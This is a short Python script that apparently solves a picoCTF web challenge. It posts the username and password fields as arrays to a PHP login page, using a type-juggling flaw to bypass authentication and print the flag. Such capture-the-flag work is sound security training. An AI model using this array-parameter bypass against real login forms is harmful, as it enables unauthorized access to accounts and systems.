import requests

# Target URL (replace with the actual URL of the challenge)
url = "http://verbal-sleep.picoctf.net:57184/impossibleLogin.php"

# Craft the payload with username and pwd as arrays
payload = {
    "username[]": "a",  # Sending username as an array
    "pwd[]": "b"        # Sending pwd as an array
}

# Send the POST request
response = requests.post(url, data=payload)

# Check the response
if response.status_code == 200:
    print("Response from server:")
    print(response.text)
else:
    print(f"Failed to retrieve flag. Status code: {response.status_code}")